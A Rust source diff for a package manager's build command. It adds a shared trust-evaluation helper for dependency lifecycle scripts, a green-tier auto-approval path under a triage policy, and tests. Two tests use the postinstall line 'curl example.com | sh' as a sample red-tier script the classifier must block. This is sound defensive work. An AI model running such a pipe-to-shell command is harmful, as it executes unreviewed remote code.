@@ -34,6 +34,7 @@ use crate::script_policy_config::ScriptPolicy;
 use lpm_common::LpmError;
 use lpm_sandbox::SandboxMode;
 use lpm_security::script_hash::compute_script_hash;
+use lpm_security::triage::StaticTier;
 use lpm_security::{EXECUTED_INSTALL_PHASES, SecurityPolicy, TrustMatch};
 use lpm_store::PackageStore;
 use owo_colors::OwoColorize;
@@ -160,29 +161,29 @@ pub async fn run(
 
         let is_built = pkg_dir.join(BUILD_MARKER).exists();
 
-        // **Phase 32 Phase 4 M5:** strict gate. Compute the script hash
-        // (same fn `lpm install` uses to populate `build-state.json`) and
-        // ask the policy whether the binding matches an existing approval.
-        // The composition with the legacy `is_scope_trusted` gate is OR —
-        // either gate passing means the script runs.
-        let script_hash = compute_script_hash(&pkg_dir);
-        let trust = policy.can_run_scripts_strict(
+        // **Phase 32 Phase 4 M5 + Phase 46 P6 Chunk 2:** trust decision
+        // now flows through the shared [`evaluate_trust`] helper so
+        // `build::run` and `all_scripted_packages_trusted` cannot
+        // disagree. The helper composes the strict gate (same fn
+        // `lpm install` uses to populate `build-state.json`) with the
+        // `is_scope_trusted` scope glob AND the P6 green-tier auto-
+        // trust path (Chunk 2 consumer — active only under
+        // [`ScriptPolicy::Triage`]).
+        let trust_reason = evaluate_trust(
+            &pkg_dir,
             &lp.name,
             &lp.version,
             lp.integrity.as_deref(),
-            script_hash.as_deref(),
+            &scripts,
+            &policy,
+            project_dir,
+            effective_policy,
         );
-        let (is_trusted, drift) = match trust {
-            TrustMatch::Strict => (true, false),
-            TrustMatch::LegacyNameOnly => (true, false),
-            TrustMatch::BindingDrift { .. } => (false, true),
-            TrustMatch::NotTrusted => (false, false),
-        };
-        let is_trusted = is_trusted || is_scope_trusted(&lp.name, project_dir);
+        let is_trusted = trust_reason.is_trusted();
 
         // Surface drift to the user — even though the script is skipped,
         // they need to know WHY so they can re-review with `lpm approve-builds`.
-        if drift && !json_output {
+        if trust_reason == TrustReason::BindingDrift && !json_output {
             output::warn(&format!(
                 "{}: stored approval drifted (script changed since approval). \
                  Re-run `lpm approve-builds {}` to re-review.",
@@ -191,9 +192,10 @@ pub async fn run(
         }
         // Surface legacy bare-name entries with a soft deprecation warning,
         // so users migrate to the strict binding form. Only emit when the
-        // strict gate would have been the deciding factor (skip when scope
-        // trust would have approved anyway).
-        if matches!(trust, TrustMatch::LegacyNameOnly) && !json_output {
+        // strict gate was the deciding factor (the helper returns
+        // `LegacyName` only when `TrustMatch::LegacyNameOnly` won AND
+        // scope did not).
+        if trust_reason == TrustReason::LegacyName && !json_output {
             output::warn(&format!(
                 "{}: legacy bare-name trustedDependencies entry — run \
                  `lpm approve-builds {}` to upgrade to a strict (script-hash-bound) approval",
@@ -208,6 +210,7 @@ pub async fn run(
             scripts,
             is_built,
             is_trusted,
+            trust_reason,
         });
     }
 
@@ -303,8 +306,23 @@ pub async fn run(
                 to_build.len()
             ));
             for pkg in &to_build {
+                // Phase 46 P6 Chunk 2: when a package is trusted via
+                // the green-tier auto-trust path (no manifest binding,
+                // no scope match — only the Layer 1 static-gate
+                // classifier + triage policy) surface that to the
+                // user. Without this suffix a triage user who sees
+                // `trusted ✓` next to a package they never added to
+                // `trustedDependencies` has no visible explanation;
+                // the suffix also makes it obvious which packages
+                // move into the manual-review lane if the user flips
+                // back to `deny`.
                 let trust = if pkg.is_trusted {
-                    "trusted ✓".green().to_string()
+                    match pkg.trust_reason {
+                        TrustReason::GreenTierUnderTriage => {
+                            "trusted ✓ (green-tier auto-approval)".green().to_string()
+                        }
+                        _ => "trusted ✓".green().to_string(),
+                    }
                 } else {
                     "not trusted".yellow().to_string()
                 };
@@ -368,6 +386,24 @@ pub async fn run(
 
     if !json_output {
         output::info(&format!("Building {} package(s)...", to_build.len()));
+        // Phase 46 P6 Chunk 2: summary line for green-tier auto-
+        // approvals. Under `script-policy = "triage"`, the shared
+        // [`evaluate_trust`] helper promotes packages whose lifecycle
+        // scripts match the Layer 1 static-gate allowlist (P2) even
+        // without a `trustedDependencies` entry. Most installs won't
+        // have any; skip the line when the count is zero so quiet
+        // builds stay quiet. The line is descriptive-only — it does
+        // NOT change what runs or in which order.
+        let green_auto_count = to_build
+            .iter()
+            .filter(|p| p.trust_reason == TrustReason::GreenTierUnderTriage)
+            .count();
+        if green_auto_count > 0 {
+            output::info(&format!(
+                "  {green_auto_count} of these were auto-approved by green-tier classification \
+                 (script-policy = \"triage\"). Run `lpm build --dry-run` to see why."
+            ));
+        }
     }
 
     // Execute scripts
@@ -848,6 +884,152 @@ struct ScriptablePackage {
     scripts: HashMap<String, String>,
     is_built: bool,
     is_trusted: bool,
+    /// **Phase 46 P6 Chunk 2:** the specific basis on which
+    /// `is_trusted` was decided. Preserved so the dry-run output and
+    /// the pre-loop summary can surface WHY a script was trusted
+    /// (strict binding vs. scope vs. green-tier auto-approval under
+    /// triage). `is_trusted` is a direct read of
+    /// [`TrustReason::is_trusted`] — the field pair is kept because
+    /// most call sites only care about the boolean and splitting the
+    /// read avoids threading [`TrustReason`] through downstream code.
+    trust_reason: TrustReason,
+}
+
+/// Why a scripted package was (or was not) trusted to execute its
+/// lifecycle scripts under the current effective [`ScriptPolicy`].
+///
+/// The variants are ordered by evaluation priority inside
+/// [`evaluate_trust`]: strict-gate matches win over scope globs, which
+/// win over the P6 green-tier auto-trust. Drift is a terminal "no" —
+/// a drifted rich binding never auto-recovers via triage even when
+/// the current on-disk script would classify green; the user must
+/// re-review via `lpm approve-builds`.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum TrustReason {
+    /// Rich strict binding (Phase 32 Phase 4): `{name, version,
+    /// integrity, scriptHash}` tuple matches an approved entry.
+    StrictBinding,
+    /// Pre-Phase-4 legacy bare-name `trustedDependencies: ["name"]`
+    /// entry. Matched via `TrustMatch::LegacyNameOnly`. Callers
+    /// still emit a soft deprecation warning so users migrate to
+    /// the rich form.
+    LegacyName,
+    /// `lpm.scripts.trustedScopes` glob match (e.g., `@myorg/*`).
+    ScopedGlob,
+    /// `script-policy = "triage"` + worst-wins classification of
+    /// the package's lifecycle phases is [`StaticTier::Green`]. This
+    /// is the P6 auto-trust path — the package carries no manifest
+    /// binding, but its scripts match the hand-curated Layer 1
+    /// allowlist (`node-gyp rebuild`, `tsc`, `prisma generate`,
+    /// `husky install`, `electron-rebuild`, relative-path `node`
+    /// calls). Only reachable under [`ScriptPolicy::Triage`].
+    GreenTierUnderTriage,
+    /// Strict binding exists but its stored `scriptHash` no longer
+    /// matches the on-disk body. Triage does NOT auto-recover this:
+    /// the user previously approved a specific script and the script
+    /// changed, so a re-review is required. Matches `build::run`'s
+    /// pre-P6 semantics exactly.
+    BindingDrift,
+    /// No trust basis found.
+    Untrusted,
+}
+
+impl TrustReason {
+    /// Single point where the helper's output gets collapsed to the
+    /// build pipeline's boolean `is_trusted`. Kept on the enum so both
+    /// call sites (`build::run` and `all_scripted_packages_trusted`)
+    /// can never drift on which reasons count as trusted.
+    pub(crate) fn is_trusted(self) -> bool {
+        matches!(
+            self,
+            Self::StrictBinding | Self::LegacyName | Self::ScopedGlob | Self::GreenTierUnderTriage,
+        )
+    }
+}
+
+/// Phase 46 P6 Chunk 2 — shared trust decision.
+///
+/// Single source of truth for "is this package trusted to execute
+/// lifecycle scripts under the current effective policy?" Consumed by
+/// both [`run`] (via its `scriptable_packages` loop) and
+/// [`all_scripted_packages_trusted`] (Chunk 3 migration) so the two
+/// paths cannot disagree on trust the first time one gets tweaked.
+///
+/// Evaluation order — the first matching rule wins:
+/// 1. **Strict gate** ([`SecurityPolicy::can_run_scripts_strict`]).
+///    A rich binding that matches the full tuple yields
+///    [`TrustReason::StrictBinding`]; a legacy bare-name entry yields
+///    [`TrustReason::LegacyName`]; a rich binding whose `scriptHash`
+///    drifted yields [`TrustReason::BindingDrift`] — terminal, never
+///    overridden by later rules.
+/// 2. **Scope glob** (`lpm.scripts.trustedScopes`). Glob match yields
+///    [`TrustReason::ScopedGlob`].
+/// 3. **Green-tier auto-trust** (NEW in P6). Only when
+///    `effective_policy == Triage`: classify every present lifecycle
+///    phase via [`lpm_security::static_gate::classify`], reduce
+///    worst-wins (same precedence `build_state.rs` uses at install
+///    time), and if the result is [`StaticTier::Green`] yield
+///    [`TrustReason::GreenTierUnderTriage`]. Amber / AmberLlm / Red
+///    flow through to untrusted regardless of policy.
+///
+/// The classifier is the authoritative tier source — we do NOT read
+/// back from `build-state.json`. That file is an install-time cache
+/// and a user-facing artifact; calling `lpm build` standalone (no
+/// preceding install) must still yield the same decision. Matches the
+/// Chunk 2 signoff answer to ambiguity #4.
+///
+/// Drift is never auto-recovered under triage. A drifted rich binding
+/// means the user previously approved a different script body; even
+/// if the current on-disk script classifies green, the user still
+/// needs to re-review the delta via `lpm approve-builds`. This keeps
+/// the security floor at "no execution without current reviewer
+/// intent" (D20).
+#[allow(clippy::too_many_arguments)]
+pub(crate) fn evaluate_trust(
+    package_dir: &Path,
+    name: &str,
+    version: &str,
+    integrity: Option<&str>,
+    scripts: &HashMap<String, String>,
+    policy: &SecurityPolicy,
+    project_dir: &Path,
+    effective_policy: ScriptPolicy,
+) -> TrustReason {
+    let script_hash = compute_script_hash(package_dir);
+    let strict = policy.can_run_scripts_strict(name, version, integrity, script_hash.as_deref());
+    match strict {
+        TrustMatch::Strict => return TrustReason::StrictBinding,
+        TrustMatch::LegacyNameOnly => return TrustReason::LegacyName,
+        TrustMatch::BindingDrift { .. } => return TrustReason::BindingDrift,
+        TrustMatch::NotTrusted => {}
+    }
+
+    if is_scope_trusted(name, project_dir) {
+        return TrustReason::ScopedGlob;
+    }
+
+    if effective_policy == ScriptPolicy::Triage
+        && classify_package_worst_tier(scripts) == Some(StaticTier::Green)
+    {
+        return TrustReason::GreenTierUnderTriage;
+    }
+
+    TrustReason::Untrusted
+}
+
+/// Worst-wins classification across the lifecycle phases present in
+/// `scripts`. Returns `None` when `scripts` is empty (caller has
+/// already early-returned in practice, since the trust-decision call
+/// sites only run after at least one lifecycle script was found).
+///
+/// Mirrors the reduction at `build_state.rs:418-421` exactly so the
+/// install-time annotation and the `lpm build` gate agree on tier
+/// per-package without sharing cached state.
+fn classify_package_worst_tier(scripts: &HashMap<String, String>) -> Option<StaticTier> {
+    scripts
+        .values()
+        .map(|body| lpm_security::static_gate::classify(body))
+        .reduce(StaticTier::worse_of)
 }
 
 /// Count scripted packages that would be skipped under the default
@@ -1318,6 +1500,7 @@ mod tests {
                 scripts: HashMap::new(),
                 is_built: false,
                 is_trusted: true,
+                trust_reason: TrustReason::StrictBinding,
             },
             ScriptablePackage {
                 name: "b".into(),
@@ -1326,6 +1509,7 @@ mod tests {
                 scripts: HashMap::new(),
                 is_built: false,
                 is_trusted: true,
+                trust_reason: TrustReason::StrictBinding,
             },
         ];
         let refs: Vec<&ScriptablePackage> = packages.iter().collect();
@@ -1674,6 +1858,7 @@ mod tests {
                 scripts: HashMap::from([("postinstall".into(), "node setup".into())]),
                 is_built: false,
                 is_trusted: true,
+                trust_reason: TrustReason::StrictBinding,
             },
             ScriptablePackage {
                 name: "esbuild".into(),
@@ -1682,6 +1867,7 @@ mod tests {
                 scripts: HashMap::from([("postinstall".into(), "node install.js".into())]),
                 is_built: false,
                 is_trusted: true,
+                trust_reason: TrustReason::StrictBinding,
             },
         ];
 
@@ -1936,7 +2122,11 @@ mod tests {
     /// Construct a `ScriptablePackage` with synthetic values. The
     /// counter cares only about `is_built` and `is_trusted`; other
     /// fields are irrelevant but must be populated to satisfy the
-    /// struct shape.
+    /// struct shape. `trust_reason` is derived from `is_trusted` so
+    /// the field always stays internally consistent with the boolean
+    /// — Chunk 2 added it, and a test synthesizing a trusted package
+    /// with `TrustReason::Untrusted` would misrepresent the P6 data
+    /// model even though the counter wouldn't notice.
     fn synthetic_scriptable(name: &str, is_built: bool, is_trusted: bool) -> ScriptablePackage {
         ScriptablePackage {
             name: name.into(),
@@ -1945,6 +2135,11 @@ mod tests {
             scripts: HashMap::from([("postinstall".into(), "node x.js".into())]),
             is_built,
             is_trusted,
+            trust_reason: if is_trusted {
+                TrustReason::StrictBinding
+            } else {
+                TrustReason::Untrusted
+            },
         }
     }
 
@@ -1992,5 +2187,358 @@ mod tests {
             synthetic_scriptable("b", false, true),
         ];
         assert_eq!(count_untrusted_unbuilt(&pkgs, false), 0);
+    }
+
+    // ── Phase 46 P6 Chunk 2: shared trust helper behavior ───────────
+    //
+    // These tests pin `evaluate_trust` under each effective policy ×
+    // static-tier combination that materially changes behavior. The
+    // helper is the only place where "green-tier auto-trust" is
+    // decided — both `build::run` and the Chunk 3 install-time
+    // `all_scripted_packages_trusted` migration route through here,
+    // so single-point coverage is sufficient for the policy decision.
+    // The composition of the decision with the surrounding control
+    // flow (which packages get skipped, what message prints, what
+    // gets sandboxed) is covered by `build::run`'s integration tests
+    // in Chunk 5.
+    //
+    // Every test writes a synthetic package into a temp store with
+    // real lifecycle scripts so `compute_script_hash` and the static-
+    // gate classifier produce live values — not stubs — matching how
+    // `build::run` will invoke the helper in production.
+
+    /// Write a synthetic package into a `PackageStore` with the
+    /// given postinstall body, and return its path. The postinstall
+    /// body is what the static-gate classifier consumes, so tests
+    /// exercising green/amber/red tiers pick their body accordingly.
+    fn write_p6_pkg(
+        store: &PackageStore,
+        name: &str,
+        version: &str,
+        postinstall: &str,
+    ) -> std::path::PathBuf {
+        let pkg_dir = store.package_dir(name, version);
+        std::fs::create_dir_all(&pkg_dir).unwrap();
+        std::fs::write(
+            pkg_dir.join("package.json"),
+            format!(
+                r#"{{"name":"{name}","version":"{version}","scripts":{{"postinstall":"{postinstall}"}}}}"#,
+            ),
+        )
+        .unwrap();
+        pkg_dir
+    }
+
+    #[test]
+    fn p6_chunk2_triage_promotes_green_tier_without_manifest_binding() {
+        // The core P6 behavior: a package with a green-tier postinstall
+        // (node-gyp rebuild — exact match in the Layer 1 allowlist),
+        // no `trustedDependencies` entry, no scope match, lands on
+        // `GreenTierUnderTriage` under Triage. This is the auto-trust
+        // path — every other path either required manifest work or
+        // didn't exist.
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
+        let store = PackageStore::at(dir.path().join("store"));
+        let pkg_dir = write_p6_pkg(&store, "some-native-pkg", "1.0.0", "node-gyp rebuild");
+        let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+        let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
+
+        let reason = evaluate_trust(
+            &pkg_dir,
+            "some-native-pkg",
+            "1.0.0",
+            None,
+            &scripts,
+            &policy,
+            dir.path(),
+            ScriptPolicy::Triage,
+        );
+        assert_eq!(reason, TrustReason::GreenTierUnderTriage);
+        assert!(reason.is_trusted());
+    }
+
+    #[test]
+    fn p6_chunk2_deny_does_not_promote_green_tier() {
+        // Deny must stay deny: no promotion, regardless of tier.
+        // Matches the signoff answer to ambiguity #3.
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
+        let store = PackageStore::at(dir.path().join("store"));
+        let pkg_dir = write_p6_pkg(&store, "some-native-pkg", "1.0.0", "node-gyp rebuild");
+        let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+        let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
+
+        let reason = evaluate_trust(
+            &pkg_dir,
+            "some-native-pkg",
+            "1.0.0",
+            None,
+            &scripts,
+            &policy,
+            dir.path(),
+            ScriptPolicy::Deny,
+        );
+        assert_eq!(reason, TrustReason::Untrusted);
+        assert!(!reason.is_trusted());
+    }
+
+    #[test]
+    fn p6_chunk2_allow_does_not_promote_green_tier_at_helper_level() {
+        // `allow` semantics (build everything regardless of trust)
+        // are the caller's concern — `build::run` / Chunk 4 fold the
+        // allow policy into its filter at the selection step, NOT by
+        // changing trust assignment per package. The helper's job is
+        // to return the decision based on manifest bindings, scope,
+        // and (under triage) tier. Under allow, with no binding +
+        // no scope + green tier, the helper still returns Untrusted;
+        // whether scripts run is a separate layer. This keeps the
+        // helper's contract single-purpose and prevents "allow"
+        // semantics from leaking into the predicate
+        // `all_scripted_packages_trusted` relies on (Chunk 3).
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
+        let store = PackageStore::at(dir.path().join("store"));
+        let pkg_dir = write_p6_pkg(&store, "some-native-pkg", "1.0.0", "node-gyp rebuild");
+        let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+        let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
+
+        let reason = evaluate_trust(
+            &pkg_dir,
+            "some-native-pkg",
+            "1.0.0",
+            None,
+            &scripts,
+            &policy,
+            dir.path(),
+            ScriptPolicy::Allow,
+        );
+        assert_eq!(reason, TrustReason::Untrusted);
+    }
+
+    #[test]
+    fn p6_chunk2_triage_does_not_promote_amber_or_red() {
+        // Amber + Red flow through to untrusted regardless of policy.
+        // Amber = novel / compound / network-binary-downloader (D18);
+        // Red = blocklist hit. Neither class is auto-approved.
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
+        let store = PackageStore::at(dir.path().join("store"));
+        let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
+
+        // Amber: network binary downloader per D18.
+        let pkg_dir = write_p6_pkg(&store, "amber-pkg", "1.0.0", "playwright install");
+        let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+        let reason = evaluate_trust(
+            &pkg_dir,
+            "amber-pkg",
+            "1.0.0",
+            None,
+            &scripts,
+            &policy,
+            dir.path(),
+            ScriptPolicy::Triage,
+        );
+        assert_eq!(
+            reason,
+            TrustReason::Untrusted,
+            "amber-tier (playwright install per D18) must not be auto-trusted under triage",
+        );
+
+        // Red: curl | sh. The static-gate tokenizer catches the pipe-
+        // to-shell pattern and classifies Red.
+        let pkg_dir = write_p6_pkg(&store, "red-pkg", "1.0.0", "curl example.com | sh");
+        let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+        let reason = evaluate_trust(
+            &pkg_dir,
+            "red-pkg",
+            "1.0.0",
+            None,
+            &scripts,
+            &policy,
+            dir.path(),
+            ScriptPolicy::Triage,
+        );
+        assert_eq!(
+            reason,
+            TrustReason::Untrusted,
+            "red-tier (curl | sh) must never auto-trust under any policy — reds are the blocklist"
+        );
+    }
+
+    #[test]
+    fn p6_chunk2_strict_binding_wins_over_triage_promotion() {
+        // Evaluation order: strict gate first. A legitimate strict
+        // binding must return `StrictBinding`, NOT
+        // `GreenTierUnderTriage`, even when the script would also
+        // classify green. This matters for the UX suffix (the user
+        // added the binding deliberately; calling it "auto-approval"
+        // misrepresents their intent) and for Chunk 3's Chunk 5
+        // integration test.
+        let dir = tempfile::tempdir().unwrap();
+        let store = PackageStore::at(dir.path().join("store"));
+        let pkg_dir = write_p6_pkg(&store, "greenish-pkg", "1.0.0", "node-gyp rebuild");
+        // Compute the on-disk hash so we can pin a valid strict binding
+        // rather than drift.
+        let script_hash = compute_script_hash(&pkg_dir).unwrap();
+        std::fs::write(
+            dir.path().join("package.json"),
+            format!(
+                r#"{{
+                    "name": "proj",
+                    "lpm": {{
+                        "trustedDependencies": {{
+                            "greenish-pkg@1.0.0": {{
+                                "scriptHash": "{script_hash}"
+                            }}
+                        }}
+                    }}
+                }}"#
+            ),
+        )
+        .unwrap();
+        let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+        let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
+
+        let reason = evaluate_trust(
+            &pkg_dir,
+            "greenish-pkg",
+            "1.0.0",
+            None,
+            &scripts,
+            &policy,
+            dir.path(),
+            ScriptPolicy::Triage,
+        );
+        assert_eq!(
+            reason,
+            TrustReason::StrictBinding,
+            "strict binding must win over triage green-tier promotion so the UX \
+             suffix and downstream consumers see the explicit user intent"
+        );
+    }
+
+    #[test]
+    fn p6_chunk2_binding_drift_never_auto_recovers_under_triage() {
+        // D20 floor: a drifted rich binding means the user previously
+        // approved a DIFFERENT script; the current on-disk body hasn't
+        // been reviewed. Even if it classifies green, triage must not
+        // auto-recover. Re-review via `lpm approve-builds` is the only
+        // path back.
+        let dir = tempfile::tempdir().unwrap();
+        let store = PackageStore::at(dir.path().join("store"));
+        let pkg_dir = write_p6_pkg(&store, "drifted-pkg", "1.0.0", "node-gyp rebuild");
+        // Wrong script_hash → BindingDrift.
+        std::fs::write(
+            dir.path().join("package.json"),
+            r#"{
+                "name": "proj",
+                "lpm": {
+                    "trustedDependencies": {
+                        "drifted-pkg@1.0.0": {
+                            "scriptHash": "sha256-deliberately-wrong-hash-to-force-drift"
+                        }
+                    }
+                }
+            }"#,
+        )
+        .unwrap();
+        let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+        let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
+
+        let reason = evaluate_trust(
+            &pkg_dir,
+            "drifted-pkg",
+            "1.0.0",
+            None,
+            &scripts,
+            &policy,
+            dir.path(),
+            ScriptPolicy::Triage,
+        );
+        assert_eq!(
+            reason,
+            TrustReason::BindingDrift,
+            "triage must NOT auto-recover a drifted binding — even if the current \
+             on-disk script classifies green, user intent was on a different body"
+        );
+        assert!(!reason.is_trusted());
+    }
+
+    #[test]
+    fn p6_chunk2_scope_glob_wins_over_triage_promotion() {
+        // Scope match is a deliberate user configuration — ranks
+        // above the tier promotion for the same reason strict binding
+        // does. The user wrote `@myorg/*` into trustedScopes; any
+        // `@myorg/*` package returns `ScopedGlob`, not
+        // `GreenTierUnderTriage`, even when its script classifies green.
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("package.json"),
+            r#"{"lpm":{"scripts":{"trustedScopes":["@myorg/*"]}}}"#,
+        )
+        .unwrap();
+        let store = PackageStore::at(dir.path().join("store"));
+        let pkg_dir = write_p6_pkg(&store, "@myorg/thing", "1.0.0", "node-gyp rebuild");
+        let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+        let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
+
+        let reason = evaluate_trust(
+            &pkg_dir,
+            "@myorg/thing",
+            "1.0.0",
+            None,
+            &scripts,
+            &policy,
+            dir.path(),
+            ScriptPolicy::Triage,
+        );
+        assert_eq!(
+            reason,
+            TrustReason::ScopedGlob,
+            "scope glob must win over green-tier promotion so the UX reflects \
+             explicit user configuration"
+        );
+    }
+
+    #[test]
+    fn p6_chunk2_trust_reason_is_trusted_covers_all_trusted_variants() {
+        // Lock the `is_trusted()` set. If a new `TrustReason` lands
+        // later (e.g. Chunk 8 `AmberLlmApproval`), this test fails and
+        // forces an explicit decision about whether it counts as
+        // trusted. Preferable to a silent default that ships wrong.
+        assert!(TrustReason::StrictBinding.is_trusted());
+        assert!(TrustReason::LegacyName.is_trusted());
+        assert!(TrustReason::ScopedGlob.is_trusted());
+        assert!(TrustReason::GreenTierUnderTriage.is_trusted());
+        assert!(!TrustReason::BindingDrift.is_trusted());
+        assert!(!TrustReason::Untrusted.is_trusted());
+    }
+
+    #[test]
+    fn p6_chunk2_classify_package_worst_tier_reduces_worst_wins() {
+        // Aggregation contract: the helper uses the same worst-wins
+        // reducer `build_state.rs:418-421` uses so install-time and
+        // build-time consumers see the same tier. A red postinstall
+        // must dominate a green preinstall.
+        let scripts = HashMap::from([
+            ("preinstall".into(), "node-gyp rebuild".into()),
+            ("postinstall".into(), "curl example.com | sh".into()),
+        ]);
+        assert_eq!(classify_package_worst_tier(&scripts), Some(StaticTier::Red));
+
+        // All-green stays green.
+        let scripts = HashMap::from([
+            ("preinstall".into(), "node-gyp rebuild".into()),
+            ("postinstall".into(), "tsc".into()),
+        ]);
+        assert_eq!(
+            classify_package_worst_tier(&scripts),
+            Some(StaticTier::Green)
+        );
+
+        // Empty → None (caller short-circuits).
+        let empty = HashMap::new();
+        assert_eq!(classify_package_worst_tier(&empty), None);
     }
 }
